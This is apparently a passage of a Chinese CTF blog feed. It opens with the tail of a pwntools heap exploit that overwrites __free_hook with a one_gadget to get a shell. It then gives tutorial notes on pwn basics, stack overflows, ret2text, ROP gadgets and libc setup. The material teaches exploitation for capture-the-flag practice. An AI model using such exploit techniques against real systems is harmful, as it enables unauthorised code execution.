string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'173.41.49.110'</span><span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_content</span><span class="token punctuation">(</span>card_size<span class="token punctuation">,</span> heap_size<span class="token punctuation">,</span> level<span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'count'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>card_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'range'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>heap_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'level'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>level<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> card<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'set'</span><span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebc61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27-3/libc-2.27.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseset_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频版：&lt;a href=&quot;https://www.bilibili.com/video/BV1p8BoYPEae&quot;&gt;https://www.bilibili.com/video/BV1p8BoYPEae&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;程序使用&lt;code&gt;rand&lt;/code&gt;函数模</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>《重生之我在yctu做pwn手》系列视频笔记</title>
    <link href="https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/"/>
    <id>https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/</id>
    <published>2024-11-06T07:41:19.214Z</published>
    <updated>2024-12-04T08:45:34.573Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-pwn环境配置"><a href="#1-pwn环境配置" class="headerlink" title="1.pwn环境配置"></a>1.pwn环境配置</h2><p>视频讲解：<a href="https://www.bilibili.com/video/BV1YT1oYeEVd">https://www.bilibili.com/video/BV1YT1oYeEVd</a></p><p>配置指令：<a href="https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/">https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/</a></p><h2 id="2-基础知识-amp-ret2text"><a href="#2-基础知识-amp-ret2text" class="headerlink" title="2.基础知识 &amp; ret2text"></a>2.基础知识 &amp; ret2text</h2><h3 id="PWN解题目标"><a href="#PWN解题目标" class="headerlink" title="PWN解题目标"></a>PWN解题目标</h3><p>获取远程靶机里的<code>flag</code>文件中的字符串（<code>flag</code>是<strong>动态</strong>的，每个队伍的<code>flag</code>不同）</p><ul><li><p>获取<code>shell</code>：和远程终端交互通过<code>cat flag</code>获取</p><p>可以获取<code>shell</code>的函数：**<code>system(&#39;/bin/sh&#39;)</code>**<code>system(&#39;sh&#39;)</code><code>system(&#39;$0&#39;)</code></p><p>ps:读的是远程的<code>flag</code>文件，本地可以用<code>ls</code>确认是否获得<code>shell</code>或创建一个<code>flag</code>文件</p></li><li><p>读取<code>flag</code>（<code>open read write</code>）&#x2F; <code>system(&#39;cat flag&#39;)</code></p></li></ul><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> hello<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello world!"</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> res<span class="token punctuation">;</span>        res <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>        c <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Result is: %d"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><p>在终端直接与远程程序交互：<code>nc ip port</code></p><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>参考文章：<a href="https://www.cnblogs.com/ve1kcon/p/17812418.html">https://www.cnblogs.com/ve1kcon/p/17812418.html</a></p><table><thead><tr><th>快捷键</th><th>作用</th></tr></thead><tbody><tr><td>n</td><td>重命名变量&#x2F;函数</td></tr><tr><td>y</td><td>修改函数原型或者变量类型</td></tr><tr><td>tab</td><td>在反汇编窗口中，进行<strong>汇编指令</strong>与<strong>伪代码</strong>之间的切换</td></tr><tr><td>esc</td><td>翻页，返回前一页面</td></tr><tr><td>space</td><td>在反汇编窗口中，进行<strong>列表视图</strong>与<strong>图形视图</strong>之间的切换</td></tr><tr><td>f12</td><td>打开字符串窗口，可用于字符串搜索</td></tr><tr><td>&#x2F;</td><td>添加注释</td></tr></tbody></table><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>参考文章：<a href="https://www.cnblogs.com/ve1kcon/p/17812420.html">https://www.cnblogs.com/ve1kcon/p/17812420.html</a></p><table><thead><tr><th>指令</th><th>作用</th></tr></thead><tbody><tr><td>gdb filename</td><td>进入调试可执行程序</td></tr><tr><td>r</td><td>开始&#x2F;重新运行程序</td></tr><tr><td>c</td><td>运行到断点&#x2F;结束</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>n</td><td>单步调试</td></tr><tr><td>s</td><td>单步调试并跟进函数</td></tr><tr><td>p&#x2F;x</td><td>用于计算（相当于计算器）</td></tr><tr><td>vmmap</td><td>获取调试进程中的虚拟映射地址范围</td></tr><tr><td>x&#x2F;gx    x&#x2F;gi    x&#x2F;gs</td><td>以数据 &#x2F; 汇编 &#x2F; 字符串的形式查看内存（x&#x2F;20gx一次查看更多数据）</td></tr><tr><td>b *address &#x2F; function_name &#x2F; *$rebase(address)</td><td>绝对地址 &#x2F; 函数名 &#x2F; 相对地址下断点</td></tr><tr><td>fin</td><td>跳出当前函数，执行到函数返回处</td></tr><tr><td>context</td><td>重新打印页面信息</td></tr><tr><td>code</td><td>查看程序基址</td></tr><tr><td>libc</td><td>查看libc基址</td></tr></tbody></table><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><code>checksec filename</code>查看架构、端序、保护</p><h4 id="elf文件格式"><a href="#elf文件格式" class="headerlink" title="elf文件格式"></a>elf文件格式</h4><ul><li><p><code>.init、.fini</code>：保存了进程初始化和结束所用的代码，这两个节通常都是由编译器自动添加</p></li><li><p><code>plt、got</code>：动态链接的跳转和全局入口表</p></li><li><p><code>.text</code>：代码段</p></li><li><p><code>.rodata</code>：保存了只读数据，可以读取但不能修改</p><p>例如示例代码中的<code>&quot;Result is: %d&quot;</code></p></li><li><p><code>.data</code>：已初始化的全局变量和局部静态变量都保存在<code>.data</code>段</p><p>例如示例代码中的<code>&quot;Hello world!&quot;</code></p></li><li><p><code>.bss</code>：未初始化的全局变量和局部静态变量默认值都为<code>0</code></p><p><code>.bss</code>段只是为未初始化的全局变量和局部静态变量预留位置没有内容，所以它在文件中也不占据空间</p><p>例如示例代码中的<code>buf</code></p></li></ul><h4 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h4><h5 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h5><p>指数据<strong>暂时存储</strong>的地方，所以才有<u>入栈、出栈</u>的说法，入栈和出栈都在栈顶（即将数据存放到数据暂存区的顶部以及从顶部取出数据），局部非静态变量存储在栈中</p><h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p><u>一个地址占<code>8</code>字节，可以使用<code>pwntools</code>的<code>p64</code>生成一个<code>64</code>位的地址</u></p><p><strong>栈</strong>：<code>rbp</code> -&gt; 栈底<code>rsp</code> -&gt; 栈顶</p><p><strong>当前执行指令寄存器</strong>：<code>rip</code></p><p><strong>传参</strong>：<code>rdi</code> -&gt; 一参<code>rsi</code> -&gt; 二参<code>rdx</code> -&gt; 三参</p><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6><p><u>一个地址占<code>4</code>字节，可以使用<code>pwntools</code>的<code>p32</code>生成一个<code>32</code>位的地址</u></p><p><strong>栈</strong>：<code>ebp</code>：栈底<code>esp</code>：栈顶</p><p><strong>当前执行指令寄存器</strong>：<code>eip</code></p><p><strong>传参</strong>：通过栈传参</p><h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5><p>详细过程讲解见视频</p><img src="/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/1.png" class><h4 id="linux保护机制"><a href="#linux保护机制" class="headerlink" title="linux保护机制"></a>linux保护机制</h4><ul><li><p><code>ASLR：Address Space Layout Randomization</code></p><p><code>linux</code>地址随机化，程序运行时的堆栈以及共享库的加载地址随机化</p><p>关闭<code>ASLR</code>:<code>sudo sysctl -w kernel.randomize_va_space=0</code></p></li><li><p><code>RELRO：RELocation Read-Only</code></p><ol><li><p><code>Full RELRO</code>：<code>got</code>表不可写</p></li><li><p><code>Partial RELRO</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭relro参数：-z norelro完全关闭-z lazy部分开启-z now完全开启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p><code>stack</code></p><p><code>canary</code>，防止栈溢出，位于<code>rbp - 0x8</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭canary参数：-fno-stack-protector<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>NX：Non-eXecute</code></p><ol><li><p><code>NX enable</code>：堆栈不可执行，仅<code>.text</code>段可执行</p></li><li><p><code>No NX</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭NX参数：-z execstack允许在堆栈上执行代码-z noexecstack禁止在堆栈上执行代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p><code>PIE</code></p><p>gcc编译，code，获取地址，下断点</p><ol><li><p><code>PIE enabled</code>：程序地址随机化</p></li><li><p><code>No PIE</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭PIE参数：-no-pie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol></li></ul><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>即返回到<code>text</code>段，劫持返回地址到后门（即覆盖<code>ret</code>为后门的地址）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>输入长度没有被限制导致覆盖到<code>ret</code></p><p>例如：<code>gets</code>函数不限制输入长度</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ul><li>检查保护（确认<code>no pie</code>以及<code>no canary</code>）</li><li>确定后门地址、变量到栈底的距离（根据<code>IDA</code>中变量后的<code>rbp-xx</code>得到与栈底的距离为<code>xx</code>）</li><li>填充中间空间（变量到栈底的距离+<code>rbp</code>的长度）并覆盖<code>ret</code>为返回地址</li></ul><h4 id="交互脚本模板"><a href="#交互脚本模板" class="headerlink" title="交互脚本模板"></a>交互脚本模板</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./filename'</span><span class="token comment">#修改成可执行文件名</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#打远程时改成1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token comment">#打远程时修改ip和端口</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment">#在需要调试的地方加上dbg()</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ret2libc"><a href="#3-ret2libc" class="headerlink" title="3.ret2libc"></a>3.ret2libc</h2><h3 id="前置基础-1"><a href="#前置基础-1" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p><code>gadget</code>：程序本身或者<code>libc</code>中存在的一些汇编指令，每一条指令有其对应的地址，将这些<code>gadget</code>地址部署到栈中可以执行该地址中存放的汇编指令</p><p>​例如：<code>ret2text</code>就是执行程序本身有的<code>system(&quot;/bin/sh&quot;);</code>指令</p><p><code>ROP</code>：一种利用现有程序中的代码片段（即<code>gadget</code>）来构造攻击的技术，通过构造一系列的<code>gadget</code>来实现攻击目标，也可以控制程序执行好几段不相邻的程序已有的代码</p><p>​例如：在返回地址处按顺序填上函数<code>func1</code>、<code>func2</code>、<code>func3</code>的地址就会依次执行这三个函数，更多的是利用其中的汇编指令</p><h4 id="工具指令"><a href="#工具指令" class="headerlink" title="工具指令"></a>工具指令</h4><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>获取<code>gadget</code>地址，<code>--binary</code>参数指定文件，可以是可执行文件或<code>libc</code>文件，<code>grep</code>用于筛选，<code>--string</code>用于筛选字符串</p><p>通过<code>pop rdi</code>可以将栈地址中的值传递给<code>rdi</code>寄存器，其他寄存器也同理，所以在构造<code>ROP</code>链时直接使用<code>p64(pop_rdi_ret) + p64(rdi_content)</code>即可控制<code>rdi</code>寄存器的值为<code>rdi_content</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span><span class="token comment">#控制寄存器的值</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--string</span> <span class="token string">'/bin/sh'</span><span class="token comment">#查找字符串</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./libc-2.35.so <span class="token parameter variable">--only</span> <span class="token string">'leave|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'leave'</span><span class="token comment">#查找leave ret指令地址</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--ropchain</span><span class="token comment">#生成现成的rop利用链直接getshell，适用于静态编译的程序</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span class="token comment">#查找ret指令的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="string"><a href="#string" class="headerlink" title="string"></a>string</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$strings</span> ./libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> GNU<span class="token comment">#获取libc版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h5><p>进入<code>glibc-all-in-one</code>文件夹下执行<code>./update_list</code>之后<code>cat list</code>确认是否有对应版本的<code>libc</code>，存在对应版本使用<code>./download libc版本名</code>进行下载，下载完成之后存在于<code>libs</code>文件夹下，需要用的时候将文件夹下的<code>libc</code>文件夹复制过去，下载失败可以直接复制下载地址到<code>windows</code>中下载再放到虚拟机里</p><p><strong>示例</strong></p><p>使用<code>strings</code>指令确定<code>libc</code>版本为<code>2.38-1ubuntu6</code>，使用<code>file</code>指令确定<code>32</code>位（也可以<code>checksec ./pwn</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$strings</span> ./libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> GNU GNU C Library <span class="token punctuation">(</span>Ubuntu GLIBC <span class="token number">2.38</span>-1ubuntu6<span class="token punctuation">)</span> stable release version <span class="token number">2.38</span>.Compiled by GNU CC version <span class="token number">13.2</span>.0.<span class="token variable">$file</span> libc.so.6 libc.so.6: ELF <span class="token number">32</span>-bit LSB shared object, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>495fc00b597566b5e14e221f563afe29ec1d8478, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认<code>list</code>列表中存在该版本的<code>libc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$cat</span> list    <span class="token number">2.23</span>-0ubuntu11.3_amd64<span class="token number">2.23</span>-0ubuntu11.3_i386<span class="token number">2.23</span>-0ubuntu3_amd64<span class="token number">2.23</span>-0ubuntu3_i386<span class="token number">2.27</span>-3ubuntu1.5_amd64<span class="token number">2.27</span>-3ubuntu1.5_i386<span class="token number">2.27</span>-3ubuntu1.6_amd64<span class="token number">2.27</span>-3ubuntu1.6_i386<span class="token number">2.27</span>-3ubuntu1_amd64<span class="token number">2.27</span>-3ubuntu1_i386<span class="token number">2.31</span>-0ubuntu9.12_amd64<span class="token number">2.31</span>-0ubuntu9.12_i386<span class="token number">2.31</span>-0ubuntu9.7_amd64<span class="token number">2.31</span>-0ubuntu9.7_i386<span class="token number">2.31</span>-0ubuntu9_amd64<span class="token number">2.31</span>-0ubuntu9_i386<span class="token number">2.35</span>-0ubuntu3.4_amd64<span class="token number">2.35</span>-0ubuntu3.4_i386<span class="token number">2.35</span>-0ubuntu3_amd64<span class="token number">2.35</span>-0ubuntu3_i386<span class="token number">2.37</span>-0ubuntu2.1_amd64<span class="token number">2.37</span>-0ubuntu2.1_i386<span class="token number">2.37</span>-0ubuntu2_amd64<span class="token number">2.37</span>-0ubuntu2_i386<span class="token number">2.38</span>-1ubuntu6_amd64<span class="token number">2.38</span>-1ubuntu6_i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载该版本的<code>libc</code>，如果下载失败可以直接复制里面的链接<code>https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb</code>在<code>windows</code>里下载再存到虚拟机里，下载完成后位于<code>libs</code>文件夹中，需要使用时直接<code>cp -r ~/glibc-all-in-one/libs/2.38-1ubuntu6_i386 ./2.38</code>复制文件夹使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$./download <span class="token number">2.38</span>-1ubuntu6_i386                   Getting <span class="token number">2.38</span>-1ubuntu6_i386  -<span class="token operator">></span> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb  -<span class="token operator">></span> Downloading libc binary package  -<span class="token operator">></span> Extracting libc binary packagex - debian-binaryx - control.tar.zstx - data.tar.zst/home/starrysky/glibc-all-in-one  -<span class="token operator">></span> Package saved to libs/2.38-1ubuntu6_i386  -<span class="token operator">></span> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.38-1ubuntu6_i386.deb  -<span class="token operator">></span> Downloading libc debug package  -<span class="token operator">></span> Extracting libc debug packagex - debian-binaryx - control.tar.zstx - data.tar.zst/home/starrysky/glibc-all-in-one  -<span class="token operator">></span> Package saved to libs/2.38-1ubuntu6_i386/.debug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h5><p>获取可执行文件的动态链接文件，包括<code>ld</code>和<code>libc</code>等</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ldd</span> ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h5><p>更改可执行文件的动态链接文件，更改<code>ld</code>可以直接指定<code>ld</code>文件，而更改<code>libc</code>需要先使用<code>ldd</code>查看原<code>libc</code>作为<code>--replace-needed</code>选项的第一个参数，一般默认是<code>libc.so.6</code></p><p><strong>libc和ld要同时更改确保在同一版本</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$patchelf</span> --replace-needed libc.so.6 